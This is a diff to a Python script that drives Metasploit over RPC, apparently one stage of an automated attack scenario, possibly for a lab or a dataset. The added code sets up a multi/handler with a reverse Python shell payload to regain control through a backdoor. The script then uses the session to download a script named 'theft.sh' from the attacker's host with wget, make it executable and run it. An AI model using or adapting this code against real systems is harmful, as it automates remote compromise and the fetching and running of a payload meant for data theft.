@@ -12,7 +12,7 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
@@ -20,17 +20,25 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
+    # Retrieve control from backdoor
+    exploit = client.modules.use('exploit', 'multi/handler')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    payload['LHOST'] = my_ip
+
     time.sleep(2)
     output_time_file = 'time_stage_3_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    shell = client.sessions.session('1')
+    exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    shell = client.sessions.session('4')
     shell.write('wget --no-check-certificate http://{0}/downloads/theft.sh'.format(my_ip))
     shell.write('chmod 755 ./theft.sh')
     shell.write('./theft.sh')
-
-    # print(flag_finish)
 
 
 main(sys.argv)
